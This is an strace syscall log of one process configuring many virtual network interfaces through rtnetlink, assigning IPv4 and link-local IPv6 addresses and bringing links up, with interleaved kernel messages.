[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x12\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x25\x08\x00\x01\x00\xac\x14\x14\x25"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="nlmon0", ifr_ifindex=18}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x12\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x25\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x25"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="nlmon0", ifr_ifindex=18}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x12\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="vxcan0", ifr_ifindex=21}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x15\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x26\x08\x00\x01\x00\xac\x14\x14\x26"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="vxcan0", ifr_ifindex=21}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x15\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="vxcan1", ifr_ifindex=22}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x16\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x27\x08\x00\x01\x00\xac\x14\x14\x27"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[   77.290845][ T5086] IPv6: ADDRCONF(NETDEV_CHANGE): hsr0: link becomes ready
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="vxcan1", ifr_ifindex=22}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x16\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="caif0", ifr_ifindex=19}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x13\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x28\x08\x00\x01\x00\xac\x14\x14\x28"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="caif0", ifr_ifindex=19}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x13\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="caif0", ifr_ifindex=19}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x13\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x28\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=64, nlmsg_type=NLMSG_ERROR, nlmsg_flags=0, nlmsg_seq=0, nlmsg_pid=1}, {error=-EOPNOTSUPP, msg=[{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x13\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x28\x00\x00"]}], 4096, 0, NULL, NULL) = 64
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="batadv0", ifr_ifindex=20}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x14\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x29\x08\x00\x01\x00\xac\x14\x14\x29"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="batadv0", ifr_ifindex=20}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x14\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x29\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x29"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="batadv0", ifr_ifindex=20}) = 0
[pid  5086] close(4)                    = 0
[   77.353880][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): vxcan1: link becomes ready
[   77.362007][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): vxcan0: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x14\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x29\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="netdevsim0", ifr_ifindex=67}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x43\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x2a\x08\x00\x01\x00\xac\x14\x14\x2a"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="netdevsim0", ifr_ifindex=67}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x43\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2a\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2a"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="netdevsim0", ifr_ifindex=67}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x43\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2a\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="xfrm0", ifr_ifindex=44}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x2c\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x2b\x08\x00\x01\x00\xac\x14\x14\x2b"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="xfrm0", ifr_ifindex=44}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x2c\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2b\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2b"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="xfrm0", ifr_ifindex=44}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x2c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2b\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=64, nlmsg_type=NLMSG_ERROR, nlmsg_flags=0, nlmsg_seq=0, nlmsg_pid=1}, {error=-EOPNOTSUPP, msg=[{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x2c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2b\x00\x00"]}], 4096, 0, NULL, NULL) = 64
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_virt_wifi", ifr_ifindex=51}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x33\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x2c\x08\x00\x01\x00\xac\x14\x14\x2c"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_virt_wifi", ifr_ifindex=51}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x33\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2c\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2c"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_virt_wifi", ifr_ifindex=51}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x33\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2c\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_virt_wifi", ifr_ifindex=50}) = 0
[pid  5086] close(4)                    = 0
[   77.403262][ T5086] 8021q: adding VLAN 0 to HW filter on device batadv0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x32\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x2d\x08\x00\x01\x00\xac\x14\x14\x2d"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_virt_wifi", ifr_ifindex=50}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x32\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2d\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2d"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_virt_wifi", ifr_ifindex=50}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x32\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2d\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="virt_wifi0", ifr_ifindex=52}) = 0
[pid  5086] close(4)                    = 0
